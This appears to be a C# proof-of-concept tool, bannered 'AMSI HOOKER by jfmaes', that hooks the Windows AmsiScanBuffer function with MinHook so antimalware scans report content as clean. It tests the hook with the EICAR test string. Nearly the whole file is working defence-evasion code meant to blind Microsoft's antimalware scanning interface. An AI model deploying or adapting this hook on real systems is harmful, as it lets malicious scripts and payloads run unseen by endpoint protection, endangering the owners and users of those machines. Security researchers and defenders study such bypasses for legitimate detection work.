using System;
using System.Runtime.InteropServices;
using System.Text;
using MinHook;

namespace SharpHookTest
{
    class Program
    {
        HookEngine engine = new HookEngine();

        /*pinvoke BS */
        public enum AMSI_RESULT
        {
            AMSI_RESULT_CLEAN = 0,
            AMSI_RESULT_NOT_DETECTED = 1,
            AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384,
            AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479,
            AMSI_RESULT_DETECTED = 32768
        }
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
        [DllImport("Amsi.dll")]
        public static extern uint AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName, IntPtr session, out AMSI_RESULT result);
        [DllImport("Amsi.dll")]
        public static extern uint AmsiInitialize(string appName, out IntPtr amsiContext);
        [DllImport("Amsi.dll")]
        public static extern void AmsiUninitialize(IntPtr amsiContext);

        /* delegate bs */
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint AmsiScanBufferDelegate(IntPtr amsiContext, byte[] buffer, uint length, string contentName, IntPtr session, out AMSI_RESULT result);

        /*og function */
        AmsiScanBufferDelegate AmsiBuffer_orig;

        /*yolo everything is clean */
        uint Amsi_Detour(IntPtr amsiContext, byte[] buffer, uint length, string contentName, IntPtr session, out AMSI_RESULT result)
        {
            result = AMSI_RESULT.AMSI_RESULT_CLEAN;
            return AmsiBuffer_orig(amsiContext, buffer, length, contentName, session, out result);
        }
        void AmsiNoMo()
        {

            IntPtr lib = LoadLibrary("Amsi.dll");
            AmsiBuffer_orig = engine.CreateHook("Amsi.dll", "AmsiScanBuffer", new AmsiScanBufferDelegate(Amsi_Detour));
            engine.EnableHooks();

        }

        void DisableHooks()
        {
            engine.DisableHooks();
        }
        void EicarTest()
        {
            var virus = Encoding.UTF8.GetBytes(
                   "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
               );

            IntPtr context;
            var hrInit = AmsiInitialize("AmsiTest", out context);
            if (hrInit != 0)
            {
                Console.WriteLine($"AmsiInitialize failed, HRESULT {hrInit:X8}");
                return;
            }

            AMSI_RESULT result;
            var hrScan = AmsiScanBuffer(
                context, virus, (uint)virus.Length,
                "EICAR Test File", IntPtr.Zero, out result
            );

            AmsiUninitialize(context);

            if (hrScan != 0)
            {
                Console.WriteLine($"AmsiScanBuffer failed, HRESULT {hrScan:X8}");
            }
            else if (result == AMSI_RESULT.AMSI_RESULT_DETECTED)
            {
                Console.WriteLine("Detected EICAR test");
            }
            else
            {
                Console.WriteLine($"Failed to detect EICAR test, result {0}", result);
            }
        }

        static void printBanner()
        {
            Console.WriteLine(@"
MWWWWMWWWMWWWWWWWWWWWWWWWWWWWWWMWWWWWWWWMWWWWMWWWMMWWWWWWWWWNK0000KNWWWWWWWWWMWWWMWWWWMWWWMWWWWWWWWM
WWWWWWWMWWWMWWWWWWWWMWWWWWWWWMWWWWWWWWMWWWWWWWWWWWWWWWWWXkl;'......'cxXWWWWWWWWMWWWWWWWWMWWWMWWWWWWW
MWWWWMWWWMWWWWWWWWMWWWMWWWWMWWWMWWWWWWWWMWWWWMWWWMWWWWKo. .':loddoc,. 'xNWWWWMWWWMWWWWMWWWMWWWWWWWWM
WWWWWWWWWWWMWWWWMWWWMWWWWWWWWMWWWWWWWWWWWWWWWWWMWWWWWO, .cOXWMWWWWWNk,  cXMWWWWWWWWWWWWWMWWWMWWWWWWW
MWWWWWWWWMWWWWWWWWWWWWWWWWWMWWWMWWWWWWWWWWWWWWWWWWMW0' .dNWWWWWWWWWWWK; .oNWWWWWWWWWWWWWWWMWWWWWWWWM
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNl  lNWWWWWWWWWWWWWk. ,KWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWM0, .OWWWWWWWWWWWWWWO. ,0WWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWk. ;KWWWWWWWWWWWWWNo  lNWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNd. cXWWWWWWWWWWWWWX: ,0WWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXl  lNWWWWWWWWWWWWWWO,:XWWWMWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWMWWWWWWWWMWWWWWWWWMWWWWWWWWMWWWMWWWWWWXO: .dWWWWWWMWWWWWWWWW0xXMWWWWMWWWMWWWWWWWWMWWWWWWW
MWWWWWWWWMWWWMMWWWMWWWMWWWWMWWWMWWWWWWWWMWWWWMWWWOl' .OWWWWMWWWMWWWWMWWWWWWWWWWWWMWWWWMWWWMWWWMWWWWW
WWWWWWWMWWWMWWWWMWWWMWWWWMWWWMWWWWMWWWWWWWWWWWWMXc.  cXWWMWWWMWWWWWWWWMWWWMWWWWMWWWMWWWWMWWWMWWWWWWW
MWWWWWWWWMWWWMWWWWWWWWWWWWWMWWWMWWWWWWWWWWWWWWW0:   ;0WWWWWWWWWWWWWWMWWWWWWWWWWWWWWWWWWWWWMWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXd. .,oXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNKkoc;cONo. ;ONWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKxl,.     ;OOxkXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXx:.          .,;:xNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWMWWWWWWWWWNx'                 ;KMWWWWWWWWWWWWWWWWWWWWWWWWWWMWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWMWWWWWWWWMWWWWNko0O;                 ;KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
MWWWWMWWWWWWWWWWWWMWWWMWWK; .d0d.               lNMWWWWWWWWMWWWWWWWWMWWWMWWWWWWWWMWWWWMWWWMWWWWWWWWM
WWWWWWWMWWWWWWWWMWWWMWWWWWx.  :OOl.            .xWWWWWWWWWWWWWWWWWWWWWMWWWMWWWWMWWWWWWWWMWWWWWWWWWWW
MWWWWWWWWMWWWWWWWWMWWWMWWWWO;  .cOOl'          :XMWWWWWWWWWMWWWMWWWWMWWWMWWWWWWWWWWWWWMWWWMWWWWWWWWM
WWWWWWWMWWWMWWWWMWWWMWWWWMWWXx,  .:xOxc.      'OWWWWWWWWWWWWWMWWWWMWWWWWWWMWWWWMWWWMWWWWMWWWMWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXk:.  'cxOko:'.'xNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWN0o;.  .;ldkOKNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWN0dc,...'xNWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNX0O0NWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWMMWWMMWWWMMWWMMWWWMWWWMMWW----AMSI HOOKER by jfmaes---WWMMWWWMWWWMMWWWMWWWMMWWWMWWWMMWWMMWWWMWWWMM
            ");
        }
        static void Main(string[] args)
        {
            printBanner();
            Program p = new Program();
            p.AmsiNoMo();
            p.EicarTest();
            p.DisableHooks();
            p.EicarTest();
            Console.ReadKey();
        }
    }
}
